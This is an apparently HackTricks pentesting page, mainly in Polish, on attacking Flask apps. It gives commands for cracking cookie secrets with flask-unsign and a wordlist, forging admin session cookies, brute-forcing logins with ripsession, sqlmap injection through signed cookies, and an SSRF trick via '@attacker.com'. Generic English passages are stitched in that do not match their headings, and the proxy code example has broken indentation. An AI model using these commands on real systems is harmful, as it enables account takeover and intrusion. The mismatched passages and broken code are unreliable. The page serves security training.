# Flask

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

**Prawdopodobnie, jeśli grasz w CTF, aplikacja Flask będzie związana z** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection/)**.**

## Ciasteczka (Cookies)

Domyślna nazwa sesji ciasteczka to **`session`**.

### Dekoder

Onlineowy dekoder ciasteczek Flask: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Ręczny

Pobierz pierwszą część ciasteczka do pierwszej kropki i zdekoduj Base64>
```bash
echo "ImhlbGxvIg" | base64 -d
```
Ciasteczko jest również podpisane za pomocą hasła

### **Flask-Unsign**

Narzędzie wiersza poleceń do pobierania, dekodowania, prób łamania i tworzenia ciasteczek sesji aplikacji Flask przez zgadywanie kluczy tajnych.

{% embed url="https://pypi.org/project/flask-unsign/" %}
```bash
pip3 install flask-unsign
```
#### **Dekodowanie ciasteczka**

To decode a Flask cookie, you can use the `itsdangerous` library, which is included in Flask. The `itsdangerous` library provides a `URLSafeTimedSerializer` class that can be used to decode and verify the integrity of the cookie.

```python
from itsdangerous import URLSafeTimedSerializer

def decode_cookie(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    try:
        decoded_data = serializer.loads(cookie_value)
        return decoded_data
    except Exception as e:
        return None
```

In the code above, the `decode_cookie` function takes two parameters: `cookie_value` and `secret_key`. The `cookie_value` parameter is the value of the cookie that you want to decode, and the `secret_key` parameter is the secret key used to sign the cookie.

The function creates an instance of the `URLSafeTimedSerializer` class with the provided `secret_key`. It then attempts to decode the `cookie_value` using the `loads` method of the serializer. If the decoding is successful, the decoded data is returned. If an exception occurs during the decoding process, `None` is returned.

Keep in mind that decoding a cookie does not necessarily mean that you can modify its contents. The `itsdangerous` library also verifies the integrity of the cookie, so if the cookie has been tampered with, the decoding process will fail.
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
#### **Atak Brute Force**

Brute Force to technika polegająca na próbie odgadnięcia hasła lub klucza, poprzez wypróbowanie wszystkich możliwych kombinacji. W przypadku aplikacji Flask, atak Brute Force może być stosowany do próby odgadnięcia hasła administratora lub innych poufnych informacji. Aby przeprowadzić atak Brute Force na aplikację Flask, można użyć narzędzi takich jak Hydra lub Burp Suite.
```bash
flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie>' --no-literal-eval
```
#### **Podpisywanie**

Flask provides a built-in mechanism for signing data to ensure its integrity and authenticity. This can be useful in scenarios where you want to verify that the data has not been tampered with.

Flask uses a secret key to sign the data. This secret key should be kept secure and should not be shared with anyone. It is recommended to store the secret key in an environment variable or a configuration file.

To sign data in Flask, you can use the `itsdangerous` module, which is included with Flask. This module provides the `URLSafeSerializer` class, which can be used to sign and verify data.

Here is an example of how to sign data using Flask:

```python
from flask import Flask
from itsdangerous import URLSafeSerializer

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    s = URLSafeSerializer(app.config['SECRET_KEY'])
    data = {'username': 'john', 'admin': False}
    signed_data = s.dumps(data)
    return signed_data

if __name__ == '__main__':
    app.run()
```

In this example, we create an instance of the `URLSafeSerializer` class with the secret key from the Flask app's configuration. We then use the `dumps()` method to sign the data and return the signed data.

To verify the signed data, you can use the `loads()` method of the `URLSafeSerializer` class. Here is an example:

```python
from flask import Flask
from itsdangerous import URLSafeSerializer, BadSignature

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'

@app.route('/')
def index():
    s = URLSafeSerializer(app.config['SECRET_KEY'])
    signed_data = 'eyJ1c2VybmFtZSI6ICJqb2huIiwgImFkbWluIjogRmFsc2V9.XXX'
    try:
        data = s.loads(signed_data)
        return str(data)
    except BadSignature:
        return 'Invalid signature'

if __name__ == '__main__':
    app.run()
```

In this example, we use the `loads()` method to verify the signed data. If the signature is valid, the original data is returned. If the signature is invalid, a `BadSignature` exception is raised.

By using the signing mechanism provided by Flask, you can ensure the integrity and authenticity of your data, helping to prevent tampering and unauthorized access.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```
#### Podpisywanie za pomocą starszych wersji

To jest metoda podpisywania, która jest stosowana w starszych wersjach.
```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```
### **RIPsession**

Narzędzie wiersza poleceń do brute-force'owania stron internetowych przy użyciu ciasteczek stworzonych za pomocą flask-unsign.

{% embed url="https://github.com/Tagvi/ripsession" %}
```bash
ripsession -u 10.10.11.100 -c "{'logged_in': True, 'username': 'changeMe'}" -s password123 -f "user doesn't exist" -w wordlist.txt
```
### SQLi w ciasteczku sesji Flask z użyciem SQLmap

[**Ten przykład**](../../pentesting-web/sql-injection/sqlmap/#eval) wykorzystuje opcję `eval` w sqlmap do **automatycznego podpisywania ładunków sqlmap** dla Flaska przy użyciu znanego sekretu.

## Proxy Flask do SSRF

[**W tym artykule**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) wyjaśnione jest, jak Flask pozwala na żądanie rozpoczynające się od znaku "@":
```http
GET @/ HTTP/1.1
Host: target.com
Connection: close
```
W przypadku następującego scenariusza:
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com/'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def proxy(path):
return get(f'{SITE_NAME}{path}').content

app.run(host='0.0.0.0', port=8080)
```
Można pozwolić na wprowadzenie czegoś takiego jak "@attacker.com", aby spowodować **SSRF**.

<figure><img src="../../.gitbook/assets/image (9) (1) (2).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
